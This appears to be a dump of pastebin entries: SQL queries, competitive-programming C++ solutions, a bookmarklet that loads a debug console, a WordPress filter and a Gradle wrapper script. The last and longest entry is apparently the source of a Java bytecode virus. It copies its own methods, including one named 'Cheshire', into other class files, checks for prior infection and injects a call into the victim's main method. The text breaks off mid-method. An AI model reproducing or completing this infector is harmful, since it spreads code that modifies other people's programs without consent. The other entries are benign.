        ,SUM(BAL_AMT) AS BAL_AMT
        ,0
        ,0
        ,0
        ,0
        ,0
    FROM 
    TBFI_BK_ACNT A
    , TBFI_BAL Y
    WHERE
    A.OSD_COA_CD = Y.COA_CD
    AND ACNT_YEAR = SUBSTR(${sDate},0,4)
    AND  A.USE_YN = 'Y'
    AND A.USE_CURY = Y.USE_CURY
     AND A.USAHA_CD LIKE '%' || ${place} || '%'
    GROUP BY
    A.BK_CD
        ,A.ACNT_NO
        ,A.OSD_COA_CD
        ,A.USAHA_CD
        ,A.DEPT_CD
        ,A.USE_CURY
        ,Y.COA_CD
    )
) FOO
GROUP BY
FOO.BK_CD
,FOO.ACNT_NO
,FOO.OSD_COA_CD
,FOO.USE_CURY
,FOO.USAHA_CD"
puXE6Fxm,D,Salvens,C++,Thursday 27th of July 2023 03:47:35 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>
#include <deque>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    deque<int> a(n);
    vector<bool> used1(n + 1), used2(n + 2);
    stack<int> st;
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
        used1[a[i]] = true;
    }
    vector<pair<int, int>> ans;
    int cur = 1;
    while (cur <= n) {
        if (used1[cur]) {
            int cnt = 0;
            while (a[0] != cur) {
                st.push(a[0]);
                used1[a[0]] = false;
                used2[a[0]] = true;
                a.pop_front();
                ++cnt;
            }
            st.push(a[0]);
            used1[a[0]] = false;
            used2[a[0]] = true;
            a.pop_front();
            ++cnt;
            ans.emplace_back(1, cnt);
            ans.emplace_back(2, 1);
            st.pop();
            ++cur;
        } else if (used2[cur]) {
            if (st.top() != cur) {
                cout << 0 << '\n';
                return 0;
            }
            ans.emplace_back(2, 1);
            used2[cur] = false;
            st.pop();
            ++cur;
        }
    }
    vector<pair<int, int>> ans1 = {ans[0]};
    for (int i = 1; i < ans.size(); ++i) {
        if (ans1.back().first == ans[i].first) {
            ++ans1.back().second;
        } else {
            ans1.emplace_back(ans[i]);
        }
    }
    for (auto& [x, y]: ans1) {
        cout << x << ' ' << y << '\n';
    }
}"
RbuYhQ2U,What name or inspect or nan,A_GUES,JavaScript,Thursday 27th of July 2023 03:35:26 AM CDT,"javascript:(function () { 
    var script = document.createElement('script'); 
    script.src = ""//cdn.jsdelivr.net/npm/eruda""; 
    document.body.appendChild(script); 
    script.onload = function () { 
        eruda.init() 
    } 
})();"
gaN4e0pR,Planting,rabbnix,C++,Thursday 27th of July 2023 03:26:04 AM CDT,"Borettslaget har åpnet en av kåres gammle Facebook profiler.
Som de skriver dritt i.

Alt kåre skriver blir redigert."
u2TLZfnD,B,Salvens,C++,Thursday 27th of July 2023 03:18:09 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

int make_op(int a, int b, char op) {
    if (op == '+') {
        return a + b;
    }
    if (op == '-') {
        return a - b;
    }
    if (op == '*') {
        return a * b;
    }
}

int convert(string& s) {
    int ans = 0;
    for (auto& i: s) {
        ans *= 10;
        ans += (int)(i - '0');
    }
    return ans;
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    stack<int> st;
    string s;
    while (cin >> s) {
        if (s[0] >= '0' && s[0] <= '9') {
            st.push(convert(s));
        } else {
            int a = st.top();
            st.pop();
            int b = st.top();
            st.pop();
            swap(a, b);
            st.push(make_op(a, b, s[0]));
        }
    }
    cout << st.top() << '\n';
}"
xD6QU1va,Untitled,ramzes4,MySQL,Thursday 27th of July 2023 02:57:49 AM CDT,"SELECT
	assignment_conditions.id,
	assignment_conditions.payment,
	assignment_conditions.delivery,
	assignment_conditions_spd.spd_id,
	assignment_conditions_spd.weight
FROM
	`yii_doc`.`assignment_conditions`
	LEFT JOIN assignment_conditions_spd ON assignment_conditions_spd.assignment_conditions_id = assignment_conditions.id 
WHERE
	assignment_conditions.payment = '0' 
	AND assignment_conditions.delivery = '3'
	AND assignment_conditions.active = 1
	AND assignment_conditions_spd.active = 1"
CBwFVAt4,A,Salvens,C++,Thursday 27th of July 2023 02:57:26 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

char invert(char c) {
    if (c == ')') {
        return '(';
    }
    if (c == ']'){
        return '[';
    }
    if (c == '}') {
        return '{';
    }
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    string s;
    cin >> s;
    stack<char> st;
    for (int i = 0; i < s.size(); ++i) {
        if (s[i] == '(' || s[i] == '[' || s[i] == '{') {
            st.push(s[i]);
        } else {
            if (st.empty() || invert(s[i]) != st.top()) {
                cout << ""no\n"";
                return 0;
            } else {
                st.pop();
            }
        }
    }
    cout << (st.empty() ? ""yes\n"": ""no\n"");
}"
kdPVW0yX,Untitled,ramzes4,MySQL,Thursday 27th of July 2023 02:53:56 AM CDT,"SELECT
	assignment_conditions_sale.id,
	assignment_conditions_sale.payment,
	assignment_conditions_sale.delivery,
	assignment_conditions_sale_spd.spd_id,
	assignment_conditions_sale_spd.weight 
FROM
	`yii_doc`.`assignment_conditions_sale`
	LEFT JOIN assignment_conditions_sale_spd ON assignment_conditions_sale_spd.assignment_conditions_sale_id = assignment_conditions_sale.id 
WHERE
	assignment_conditions_sale.payment = '0' 
	AND assignment_conditions_sale.delivery = '3' 
	AND assignment_conditions_sale.active = 1 
	AND assignment_conditions_sale_spd.active = 1"
LRYKuuDX,Untitled,wclovers,PHP,Thursday 27th of July 2023 02:48:44 AM CDT,"// Sort Store taxonomy in alphabetical order
add_filter( 'wcfm_vendor_store_taxomonies', function( $taxonomies, $vendor_id, $taxonomy ) {
    $terms = [];
    foreach( $taxonomies as $term_id => $termArray ) {
        $term = get_term( absint( $term_id ), $taxonomy );
        $terms[$term_id] = isset( $term->name ) ? $term->name : '';
    }
    asort($terms);

    foreach( $terms as $term_id => $term ) {
        $terms[$term_id] = $taxonomies[$term_id];
    }

    return $terms;
}, 10, 3 );"
P9FcraW2,gradlew.bat,FlyFar,Batch,Thursday 27th of July 2023 02:19:30 AM CDT,"@if ""%DEBUG%"" == """" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if ""%OS%""==""Windows_NT"" setlocal

set DIRNAME=%~dp0
if ""%DIRNAME%"" == """" set DIRNAME=.
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS=""-Xmx64m""

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if ""%ERRORLEVEL%"" == ""0"" goto init

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:""=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist ""%JAVA_EXE%"" goto init

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:init
@rem Get command-line arguments, handling Windows variants

if not ""%OS%"" == ""Windows_NT"" goto win9xME_args

:win9xME_args
@rem Slurp the command line arguments.
set CMD_LINE_ARGS=
set _SKIP=2

:win9xME_args_slurp
if ""x%~1"" == ""x"" goto execute

set CMD_LINE_ARGS=%*

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar

@rem Execute Gradle
""%JAVA_EXE%"" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% ""-Dorg.gradle.appname=%APP_BASE_NAME%"" -classpath ""%CLASSPATH%"" org.gradle.wrapper.GradleWrapperMain %CMD_LINE_ARGS%

:end
@rem End local scope for the variables with windows NT shell
if ""%ERRORLEVEL%""==""0"" goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
if  not """" == ""%GRADLE_EXIT_CONSOLE%"" exit 1
exit /b 1

:mainEnd
if ""%OS%""==""Windows_NT"" endlocal

:omega"
yvZSyFKP,SelfExamine.java,FlyFar,Java,Thursday 27th of July 2023 02:18:35 AM CDT,"import org.graalvm.compiler.nodes.memory.Access;

import java.io.*;
import java.lang.invoke.MethodHandles;
import java.nio.ByteBuffer;
import java.nio.file.AccessDeniedException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Properties;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipException;


public class SelfExamine{
    /**
     * Basic algorithm: Read ourself, read our own methods to copy them,
     * find main in the target class, inject our methods and inject a
     * call to the infect/copy function
     */

    /**
     * Go through all methods in our parsed class.
     * We are assuming the class we're given is probably us and therefore looking
     * for our own data to copy in preparation for our target.
     *
     * We need to copy from the constant pool:
     *  - Name
     *  - Descriptor
     *  - Items for Method Attributes, Fields. Ugh...
     *
     * How do we want to write this...
     * Something like copyMethods(findOurMethods())?
     *
     * @param parsedClass
     */
    public static void findOurMethods(HashMap<String, Object> parsedClass, HashMap<String, Object> target){
        byte[][] methods = (byte[][]) parsedClass.get(""methods"");
        byte[][] cpool = (byte[][]) parsedClass.get(""constant_pool"");
        ArrayList<String> our_methods = new ArrayList<String>();


        our_methods.add(""findOurMethods"");
        our_methods.add(""copyConstant"");
        our_methods.add(""Cheshire"");
        our_methods.add(""processVerificationTypeInfo"");
        our_methods.add(""parseClassFile"");
        our_methods.add(""instructionIndex"");
        our_methods.add(""processInstructions"");
        our_methods.add(""processAttribute"");
        our_methods.add(""getUtf8Constant"");
        our_methods.add(""addToPool"");
        our_methods.add(""classBytes"");
        our_methods.add(""copyMethod"");
        our_methods.add(""getMethodName"");
        our_methods.add(""getClassName"");
        our_methods.add(""isInfected"");
        our_methods.add(""searchFile"");


        //Loop through our methods and find the ones we're interested in
        for(int i = 0; i < methods.length; i++){
            ByteBuffer bb = ByteBuffer.wrap(Arrays.copyOfRange(methods[i], 2, 6));
            int name_index = bb.getShort();
            int descriptor_index = bb.getShort();
            String name = new String(Arrays.copyOfRange(cpool[name_index-1], 3, cpool[name_index-1].length));
            String descriptor = new String(Arrays.copyOfRange(cpool[descriptor_index-1], 3, cpool[descriptor_index-1].length));

             if(our_methods.contains(name)){
                try {
                    copyMethod(parsedClass, i, target);
                }
                catch(IOException e){
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * This is a super lame way to detect infection but it'll have to do for now.
     * If class has a method called Cheshire, return true.
     * @param parsedClass
     * @return
     */
    public static boolean isInfected(HashMap<String, Object> parsedClass){
        byte[][] methods = (byte[][]) parsedClass.get(""methods"");
        boolean infected = false;
        for(int i = 0; i < methods.length; i++){
            ByteBuffer b = ByteBuffer.wrap(methods[i]);
            b.get(new byte[2]);
            int nameIndex = b.getShort();
            b.get(new byte[4]);
            String methodName = getUtf8Constant(nameIndex, parsedClass);
            if(methodName.equals(""Cheshire"")){
                infected = true;

            }
        }
        return infected;
    }

    /**
     * Look for the main method. If it exists, inject invokestatic (cheshire methodref constant pool index)
     * Rough method for doing this with our code:
     *  1. Find main
     *  2. Find the constant pool item corresponding to the Cheshire method
     *  2. After all other methods have been added, add invokestatic [methodref] instruction as first instruction of main
     *  method in victim class.
     *  3. Add one to the first stackmapframe offset
     *
     *
     */
    public static void inject(HashMap<String, Object> origin, HashMap<String, Object> destination){
        //Are there any functions called main?
        //Get the method, get the code attribute, extract code, place instruction and see if we can extend StackMapFrame
        //We should parse through the constant pool, look for the methodref with our method name and capture the index
        byte[][] constant_pool = (byte[][]) origin.get(""constant_pool"");
        int methodRefIndex;
        byte[] instruction_bytes = new byte[3];

        //Since our main virus method is never invoked in any of the methods we've copied, we need to copy the MethodRef
        //For that method manually.

        //Find the Constant Pool index of the MethodRef for our virus.
        for(int i = 0; i < constant_pool.length; i++){
            byte[] constant = constant_pool[i];

            if(constant[0] == (byte) 10){
                byte[] natindexbytes = new byte[2];
                System.arraycopy(constant, 3 , natindexbytes, 0, 2);
                int NameAndTypeIndex = (short) (((natindexbytes[0] & 0xFF) << 8) | (natindexbytes[1] & 0xFF));
                byte[] NameAndType = constant_pool[NameAndTypeIndex-1];
                byte[] nameindexbytes = new byte[2];
                System.arraycopy(NameAndType, 1, nameindexbytes, 0, 2 );
                int NameIndex = (short) (((nameindexbytes[0] & 0xFF) << 8) | (nameindexbytes[1] & 0xFF));
                String methodName = getUtf8Constant(NameIndex, origin);
                if(methodName.equals(""Cheshire"")){
                    methodRefIndex = i+1;
                    methodRefIndex = copyConstant(origin, methodRefIndex, destination);
                    ByteBuffer bb = ByteBuffer.allocate(2);
                    bb.putShort((short) methodRefIndex);
                    byte[] index_bytes = bb.array();
                    byte invokestatic = (byte) 184;
                    instruction_bytes[0] = invokestatic;
                    instruction_bytes[1] = index_bytes[0];
                    instruction_bytes[2] = index_bytes[1];
                    ArrayList<byte[]> inject_instructions = new ArrayList<byte[]>();
                    inject_instructions.add(instruction_bytes);
                    destination.put(""inject_instructions"", inject_instructions);
                }
            }
        }

        byte[][] methods = (byte[][]) destination.get(""methods"");
        for(int i = 0; i < methods.length; i++){
            ByteBuffer b = ByteBuffer.wrap(methods[i]);
            b.get(new byte[2]);
            int nameIndex = b.getShort();
            b.get(new byte[4]);
            String methodName = getUtf8Constant(nameIndex, destination);
            if(methodName.equals(""main"")){
                try {
                    copyMethod((HashMap<String, Object>) destination.clone(), i, destination);
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }

    }

    /**
     * Fortunately for us, not much to do here. Process verification type info for items on the stack.
     * Not touching it, so essentially just copying the data.
     * @param b
     * @param origin
     * @param destination
     * @return
     */
    public static byte[] processVerificationTypeInfo(ByteBuffer b, HashMap<String, Object> origin, HashMap<String, Object> destination){
        byte tagbyte = b.get();
        int tag = tagbyte & 0xFF;
        if(tag >= 0 && tag < 7){
            ByteBuffer newbuff = ByteBuffer.allocate(1);
            newbuff.put(tagbyte);
            return newbuff.array();
        }
        else if(tag == 7){
            ByteBuffer newbuff = ByteBuffer.allocate(3);
            int index = b.getShort();
            newbuff.put(tagbyte);
            int new_index = copyConstant(origin, index, destination);
            newbuff.putShort((short) new_index);
            return newbuff.array();
        }
        else if(tag == 8){
            ByteBuffer newbuff = ByteBuffer.allocate(3);
            newbuff.put(tagbyte);
            int offset = b.getShort();
            newbuff.putShort((short) offset);
            return newbuff.array();
        }
        else {
            return null;
        }
    }

    /**
     * Convert the index in the old code byte array to an index at the same instruction in the
     * new list. Return the new index.
     * First, find the instruction position in the OldList. Then, if necessary, find the remainder.
     * Next, take that instruction position and cycle through the newList, adding the length of each instruction
     * as you go. Once that instruction position is reached, add the remainder.
     * If two instruction lists of different sizes are passed, we assume instructions are being injected at the
     * beginning of the list.
     * Step 1. How many more instructions in old list than new list?
     * Step 2. Start from equivalent position by subtracting number of instructions
     * Step 3. Add delta to instruction_pos for accurate offset
     *
     * @param index
     * @param oldList
     * @param newList
     * @return
     */
    public static int instructionIndex(int index, ArrayList<byte[]> oldList, ArrayList<byte[]> newList){
        int oldposition = 0;
        int newposition = 0;
        int remainder = 0;
        int instruction_pos = 0;
        int list_offset = 0;
        if(oldList.size() != newList.size()){
            list_offset = newList.size() - oldList.size();
        }
        // Step one: Convert old index
        while(oldposition < index){
            if(oldposition + oldList.get(instruction_pos).length <= index){
                oldposition += oldList.get(instruction_pos).length;
                instruction_pos += 1;
            }
            else if(oldposition + oldList.get(instruction_pos).length > index){
                oldposition += oldList.get(instruction_pos).length;
                instruction_pos += 1;
                remainder = oldposition - index;
                oldposition -= remainder;
            }
        }
        instruction_pos += list_offset;
        //Step two: Convert instruction_pos + remainder to new position
        for(int i = 0; i < instruction_pos; i++){
            newposition += newList.get(i).length;
        }
        return newposition;
    }

    /**
     * This function ended up being more complex than I'd thought.
     * We want to create a data structure where new offsets can be calculated based on instruction position.
     * Ideally, we keep old and new code in a 2d array and calculate offsets based on where instructions are
     * rather than doing individual calculations for each piece. I think it's also ideal if we write
     * function to translate an old position to a new one at any given time. Due to functions being processed
     * one at a time, I think it's OK to store this data in the origin and destination hash maps(if needed).
     *
     * The process of adjustment should look something like this:
     * Instructions are read into an ArrayList of byte arrays.
     * The origin class and the destination class are both given copies of the same list.
     * Following that, the origin class is processed to:
     *  1. Add new constant pool indices
     *  2. Change instructions if necessary
     *  3. adjust if, goto offsets
     *
     *  NOTE TO SELF: I SKIPPED PARSING LOOKUPSWTICH BECAUSE IT'S NOT IN ANY OF THE CODE TO BE COPIED
     * @param instructions
     * @param origin
     * @param destination
     * @return
     */
    public static byte[] processInstructions(byte[] instructions, HashMap<String, Object> origin, HashMap<String, Object> destination, ArrayList<byte[]> injectInstructions){
        ByteBuffer buffer = ByteBuffer.wrap(instructions);
        int code_length = instructions.length;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ArrayList<byte[]> byteList = new ArrayList<byte[]>();
        while(buffer.hasRemaining()){
            byte instruction = buffer.get();
            if((instruction & 0xff) == 18){
                byte index = buffer.get();
                byte[] inst_bytes = new byte[2];
                inst_bytes[0] = instruction;
                inst_bytes[1] = index;
                byteList.add(inst_bytes);
            }
            else if((instruction & 0xff) == 182 || (instruction & 0xff) == 19 || (instruction & 0xff) == 183 || (instruction & 0xff) == 192 || (instruction & 0xff) == 187 || (instruction & 0xff) == 184 || (instruction & 0xff) == 178 || (instruction & 0xff) == 189 || (instruction & 0xff) == 180 || (instruction & 0xff) == 20){
                int old_index = buffer.getShort();
                int new_index = copyConstant(origin, old_index, destination);
                ByteBuffer temp = ByteBuffer.allocate(2);
                temp.putShort((short) new_index);
                byte[] index_bytes = temp.array();
                byte[] inst_bytes = new byte[3];
                inst_bytes[0] = instruction;
                inst_bytes[1] = index_bytes[0];
                inst_bytes[2] = index_bytes[1];
                byteList.add(inst_bytes);
            }
            else if((instruction & 0xff) == 186){
                int old_index = buffer.getShort();
                int new_index = copyConstant(origin, old_index, destination);
                ByteBuffer tempBuff = ByteBuffer.allocate(2);
                tempBuff.putShort((short) new_index);
                byte[] index_bytes = tempBuff.array();
                byte b1 = buffer.get();
                byte b2 = buffer.get();
                byte[] inst_bytes = new byte[5];
                inst_bytes[0] = instruction;
                inst_bytes[1] = index_bytes[0];
                inst_bytes[2] = index_bytes[1];
                index_bytes[3] = b1;
                index_bytes[4] = b2;
                byteList.add(inst_bytes);
            }
            else if((instruction & 0xff) == 201){
                byte b1 = buffer.get();
                byte b2 = buffer.get();
                byte b3 = buffer.get();
                byte b4 = buffer.get();
                byte[] inst_bytes = new byte[5];
                inst_bytes[0] = b1;
                inst_bytes[1] = b2;
                inst_bytes[2] = b3;
                inst_bytes[3] = b4;
                byteList.add(inst_bytes);
            }
            else if((instruction & 0xff) == 185){
                int old_index = buffer.getShort();
                int new_index = copyConstant(origin, old_index, destination);
                ByteBuffer temp = ByteBuffer.allocate(2);
                temp.putShort((short) new_index);
                byte[] indexBytes = temp.array();
                byte b1 = buffer.get();
                byte b2 = buffer.get();
                byte[] inst_bytes = new byte[5];
                inst_bytes[0] = instruction;
                inst_bytes[1] = indexBytes[0];
                inst_bytes[2] = indexBytes[1];
                inst_bytes[3] = b1;
                inst_bytes[4] = b2;
                byteList.add(inst_bytes);
            }
            else if((instruction & 0xff) == 200){
                byte[] inst_bytes = new byte[5];
                inst_bytes[0] = instruction;
                byte b1 = buffer.get();
                byte b2 = buffer.get();
                byte b3 = buffer.get();
                byte b4 = buffer.get();
                inst_bytes[1] = b1;
                inst_bytes[2] = b2;
                inst_bytes[3] = b3;
                inst_bytes[4] = b4;
                byteList.add(inst_bytes);
            }
            else if((instruction & 0xff) == 17 || (instruction & 0xff) == 181 || (instruction & 0xff) == 165 || (instruction & 0xff) == 166 || (instruction & 0xff) == 159 || (instruction & 0xff) == 160 || (instruction & 0xff) == 161 || (instruction & 0xff) == 162 || (instruction & 0xff) == 163 || (instruction & 0xff) == 164 || (instruction & 0xff) == 153 || (instruction & 0xff) == 154 || (instruction & 0xff) == 155 || (instruction & 0xff) == 156 || (instruction & 0xff) == 157 || (instruction & 0xff) == 158 || (instruction & 0xff) == 199 || (instruction & 0xff) == 198 || (instruction & 0xff) == 132 || (instruction & 0xff) == 193 || (instruction & 0xff) == 168 || (instruction & 0xff) == 167 || (instruction & 0xff) == 179){
                byte b1 = buffer.get();
                byte b2 = buffer.get();
                byte[] inst_bytes = new byte[3];
                inst_bytes[0] = instruction;
                inst_bytes[1] = b1;
                inst_bytes[2] = b2;
                byteList.add(inst_bytes);

            }
            else if((instruction & 0xff) == 188 || (instruction & 0xff) == 22 || (instruction & 0xff) == 55 || (instruction & 0xff) == 25 || (instruction & 0xff) == 58 || (instruction & 0xff) == 16 || (instruction & 0xff) == 24 || (instruction & 0xff) == 57 || (instruction & 0xff) == 23 || (instruction & 0xff) == 56 || (instruction & 0xff) == 21 || (instruction & 0xff) == 54){
                byte[] inst_bytes = new byte[2];
                inst_bytes[0] = instruction;
                byte b = buffer.get();
                inst_bytes[1] = b;
                byteList.add(inst_bytes);
            }
            else if((instruction & 0xff) == 182 || (instruction & 0xff) == 183 || (instruction & 0xff) == 192 || (instruction & 0xff) == 187 || (instruction & 0xff) == 184 || (instruction & 0xff) == 178 || (instruction & 0xff) == 189 ){
                byte[] inst = new byte[3];
                inst[0] = instruction;
                int old_index = buffer.getShort();
                int new_index = copyConstant(origin, old_index, destination);
                ByteBuffer temp = ByteBuffer.allocate(2);
                temp.putShort((short) new_index);
                byte[] index_bytes = temp.array();
                inst[1] = index_bytes[0];
                inst[2] = index_bytes[1];
                byteList.add(inst);
            }
            else if((instruction & 0xff) == 197){
                byte[] inst_bytes = new byte[4];
                inst_bytes[0] = instruction;
                inst_bytes[1] = buffer.get();
                inst_bytes[2] = buffer.get();
                inst_bytes[3] = buffer.get();
                byteList.add(inst_bytes);
            }
            else {
                byte[] inst = new byte[1];
                inst[0] = instruction;
                byteList.add(inst);
            }
        }
        origin.put(""method_code"", byteList.clone());

        int code_position = 0;

        for(byte[] bytes : byteList) {
            byte[] inst = bytes;
            if (inst[0] == 18) {
                int old_index = inst[1] & 0xff;
                int new_index = copyConstant(origin, old_index, destination);
                byte[] new_inst;
                if (new_index > 255) {
                    new_inst = new byte[3];
                    ByteBuffer b = ByteBuffer.allocate(2);
                    b.putShort((short) new_index);
                    new_inst[0] = 19;
                    new_inst[1] = b.array()[0];
                    new_inst[2] = b.array()[1];
                    byteList.set(byteList.indexOf(inst), new_inst);
                } else {
                    new_inst = new byte[2];
                    new_inst[0] = 18;
                    new_inst[1] = (byte) new_index;
                    byteList.set(byteList.indexOf(inst), new_inst);
                }

            }
        }
        ArrayList<byte[]> newList = new ArrayList<byte[]>();
        if(injectInstructions != null){
            newList.addAll(injectInstructions);
            newList.addAll(byteList);
        }
        else{
            newList = byteList;
        }

        for(int i = 0; i < byteList.size(); i++){
            byte[] inst = byteList.get(i);
            int list_offset = newList.size() - byteList.size();
            int instruction = inst[0] & 0xFF;
            if((inst[0] & 0xff) == 198 || (inst[0] & 0xff) == 162 || (inst[0] & 0xff) == 159 || (inst[0] & 0xff) == 155 || (inst[0] & 0xff) == 160 || (inst[0] & 0xff) == 161 || (inst[0] & 0xff) == 162 || (inst[0] & 0xff) == 163 || (inst[0] & 0xff) == 164 || (inst[0] & 0xff) == 153 || (inst[0] & 0xff) == 199){
                int offset = (short) (((inst[1] & 0xFF) << 8) | (inst[2] & 0xFF));
                int new_position = instructionIndex(code_position, (ArrayList<byte[]>) origin.get(""method_code""), newList);
                int new_offset = instructionIndex(code_position + offset, (ArrayList<byte[]>) origin.get(""method_code""), newList)- new_position;
                ByteBuffer offset_buff = ByteBuffer.allocate(3);
                offset_buff.put(inst[0]);
                offset_buff.putShort((short) new_offset);
                newList.set(i+list_offset, offset_buff.array());
            }
            if((inst[0] & 0xff) == 167){
                int offset = (short) (((inst[1] & 0xFF) << 8) | (inst[2] & 0xFF));
                int new_position = instructionIndex(code_position, (ArrayList<byte[]>) origin.get(""method_code""), newList);
                int new_offset = instructionIndex(code_position + offset, (ArrayList<byte[]>) origin.get(""method_code""), newList)- new_position;
                ByteBuffer offset_buff = ByteBuffer.allocate(3);
                offset_buff.put(inst[0]);
                offset_buff.putShort((short) new_offset);
                newList.set(i+list_offset, offset_buff.array());
            }
            code_position += ((ArrayList<byte[]>) origin.get(""method_code"")).get(i).length;

        }
        destination.put(""method_code"", newList.clone());
        for(byte[] inst : newList){
            try {
                bos.write(inst);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        return bos.toByteArray();
    }

    /**
     * Returns an array of bytes corresponding to a set of attributes passed to it. Could be one or several.
     * @return
     */
    public static byte[] processAttribute(byte[] attribute, HashMap<String, Object> origin, HashMap<String, Object> destination, String type) {
        ByteBuffer b = ByteBuffer.allocate(attribute.length);
        ByteBuffer buffer = ByteBuffer.wrap(attribute);

        if(type.equals(""Code"")){
            //method_buffer[]
            ByteBuffer tempBuffer = ByteBuffer.allocate(4);
            tempBuffer.putShort(buffer.getShort());
            tempBuffer.putShort(buffer.getShort());
            int code_length = buffer.getInt();

            byte[] code = new byte[code_length];
            buffer.get(code);
            origin.put(""method_code"", null);
            destination.put(""method_code"", null);
            byte[] instructions = processInstructions(code, origin, destination, (ArrayList<byte[]>) destination.get(""inject_instructions""));
            b = ByteBuffer.allocate(attribute.length + (instructions.length - code_length));
            b.put(tempBuffer.array());
            code_length = instructions.length;
            b.putInt(code_length);
            b.put(instructions);
            int exception_table_length = buffer.getShort();
            b.putShort((short) exception_table_length);

            for(int c = 0; c < exception_table_length; c++){
                byte[] dump = new byte[6];
                buffer.get(dump);
                HashMap<Integer, Integer> offsets = (HashMap<Integer, Integer>) origin.get(""method_offsets"");
                int start_pc = (short) (((dump[0] & 0xFF) << 8) | (dump[1] & 0xFF));
                int end_pc = (short) (((dump[2] & 0xFF) << 8) | (dump[3] & 0xFF));
                int handler_pc = (short) (((dump[4] & 0xFF) << 8) | (dump[5] & 0xFF));
                start_pc = instructionIndex(start_pc, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code""));
                end_pc = instructionIndex(end_pc, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code""));
                handler_pc = instructionIndex(handler_pc, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code""));
                b.putShort((short) start_pc);
                b.putShort((short) end_pc);
                b.putShort((short) handler_pc);
                int catch_type = buffer.getShort();
                int new_catch_type = copyConstant(origin, catch_type, destination);
                b.putShort((short) new_catch_type);

            }

            int attributes_count = buffer.getShort();
            b.putShort((short) attributes_count);
            for(int d = 0; d < attributes_count; d++){
                int name_index = buffer.getShort();
                int new_name_index = copyConstant(origin, name_index, destination);
                b.putShort((short) new_name_index);
                int attribute_length = buffer.getInt();
                b.putInt(attribute_length);
                byte[] new_attribute = new byte[attribute_length];
                buffer.get(new_attribute);
                byte[] processedAttributed = processAttribute(new_attribute, origin, destination, getUtf8Constant(name_index, origin));
                if(processedAttributed.length == attribute_length){
                    b.put(processedAttributed);
                }
            }
            return b.array();
        }
        else if(type.equals(""LocalVariableTable"")){
            int table_length = buffer.getShort();
            HashMap<Integer, Integer> offsets = (HashMap<Integer, Integer>) origin.get(""method_offsets"");
            b.putShort((short) table_length);
            HashMap<String, int[]> LVT = new HashMap<String, int[]>();
            for(int i = 0; i < table_length; i++) {
                int start_pc = buffer.getShort();
                int length = buffer.getShort();
                int pc_length = start_pc+length;
                start_pc = instructionIndex(start_pc, (ArrayList<byte[]>) origin.get(""method_code""),(ArrayList<byte[]>) destination.get(""method_code""));
                length = instructionIndex(pc_length, (ArrayList<byte[]>) origin.get(""method_code""),(ArrayList<byte[]>) destination.get(""method_code"")) - start_pc;
                if(start_pc == 65535){
                    System.out.println(""Woah nelly!"");
                }
                b.putShort((short) start_pc);
                b.putShort((short) length);
                int orig_name_index = buffer.getShort();

                int new_name_index = copyConstant(origin, orig_name_index, destination);
                b.putShort((short) new_name_index);
                int orig_descriptor_index = buffer.getShort();
                int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
                b.putShort((short) new_descriptor_index);
                b.putShort(buffer.getShort());
                int[] values = new int[2];
                values[0] = new_name_index;
                values[1] = new_descriptor_index;
                LVT.put(getUtf8Constant(orig_name_index, origin), values);
            }
            origin.put(""LVT"", LVT);
            return b.array();
        }
        else if(type.equals(""LocalVariableTypeTable"")){
            int table_length = buffer.getShort();
            b.putShort((short) table_length);
            HashMap<String, int[]> LVT = (HashMap<String, int[]>) origin.get(""LVT"");
            HashMap<Integer, Integer> offsets = (HashMap<Integer, Integer>) origin.get(""method_offsets"");
            for(int i = 0; i < table_length; i++) {
                int start_pc = buffer.getShort();
                int length = buffer.getShort();
                int pc_length = start_pc+length;
                start_pc = instructionIndex(start_pc, (ArrayList<byte[]>) origin.get(""method_code""), (ArrayList<byte[]>) destination.get(""method_code""));
                b.putShort((short) start_pc);
